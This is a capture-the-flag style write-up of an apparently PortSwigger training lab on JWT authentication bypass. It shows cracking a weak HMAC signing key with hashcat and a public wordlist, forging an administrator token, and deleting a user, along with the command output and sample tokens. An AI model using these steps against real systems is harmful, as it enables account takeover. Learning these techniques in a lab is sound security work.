# Lab: JWT authentication bypass via weak signing key

### Instruction

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user carlos.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can download the linked wordlist and save it locally as `secrets.txt`.

Next we can login to the app with the provided credentials and grab the JWT:

```
eyJraWQiOiI2ZDYyYmQ4NS1lMTI4LTRlYTAtYjZhNy0yZWY0NDMzYWNmYWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDU5MTI5Mywic3ViIjoid2llbmVyIn0.RmYHaRZaisqUUtq44AB1m7ZbJmD24364YnJHmrI64ek
```

As expected this is for the user wiener:

```json
{
  "iss": "portswigger",
  "exp": 1794591293,
  "sub": "wiener"
}
```

Let's save this as a file called `jwt.txt`.

We can now use the tool Hashcat to crack the signing secret:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/JWT_Attacks/JWT_03_jwt_authentication_bypass_via_weak_signing_key]
└─$ hashcat jwt.txt jwt.secrets.list -m 16500
hashcat (v6.2.6) starting

<SNIP>

eyJraWQiOiI2ZDYyYmQ4NS1lMTI4LTRlYTAtYjZhNy0yZWY0NDMzYWNmYWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDU5MTI5Mywic3ViIjoid2llbmVyIn0.RmYHaRZaisqUUtq44AB1m7ZbJmD24364YnJHmrI64ek:secret1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
```

Armed with this signing key, we can forge a new JWT and set the user to administrator, and use the signing key cracked in Hashcat:

```json
{
  "iss": "portswigger",
  "exp": 1794591293,
  "sub": "administrator"
}
```

```
eyJraWQiOiI2ZDYyYmQ4NS1lMTI4LTRlYTAtYjZhNy0yZWY0NDMzYWNmYWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDU5MTI5Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.FLTl4THEHWLmy4odUPSBVz3R7BEBQ2OtyGUHNtSEN6Y
```

We can then set this token and navigate to `/admin` and delete the user carlos, solving the lab:

```
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `jwt_03.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/JWT_Attacks/JWT_03_jwt_authentication_bypass_via_weak_signing_key]
└─$ python jwt_03.py https://0a5100a203ee22fe814fde42007900b0.web-security-academy.net/
[+] Logged in as wiener
[+] Forged session cookie signed with cracked secret 'secret1', sub=administrator
[+] Deleted carlos
[+] Lab solved!
```